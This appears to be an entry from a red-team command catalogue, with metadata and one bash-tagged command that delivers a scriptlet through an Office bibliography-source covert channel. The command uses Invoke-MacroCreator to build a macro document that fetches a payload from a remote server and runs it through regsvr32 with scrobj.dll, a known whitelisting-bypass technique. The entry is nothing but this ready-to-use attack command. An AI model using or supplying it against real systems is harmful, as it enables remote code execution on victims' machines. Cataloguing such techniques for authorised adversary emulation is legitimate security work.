---
id: b609e0d0-9de8-44b9-93da-4c859a75ed07
name: Deliver scriptlet over bibliography source covert channel
type: command
executor: bash
data: Invoke-MacroCreator -i regsvr32.sct -t file -url 'http://my.server.com/sources.xml'
  -d biblio -c 'regsvr32 /u /n /s /i:regsvr32.sct scrobj.dll' -o -e
output: null
created_at: '2023-04-06T03:56:23.416497+00:00'
updated_at: '2023-04-10T20:36:48.550721+00:00'
---

# Deliver scriptlet over bibliography source covert channel

```bash
Invoke-MacroCreator -i regsvr32.sct -t file -url 'http://my.server.com/sources.xml' -d biblio -c 'regsvr32 /u /n /s /i:regsvr32.sct scrobj.dll' -o -e
```
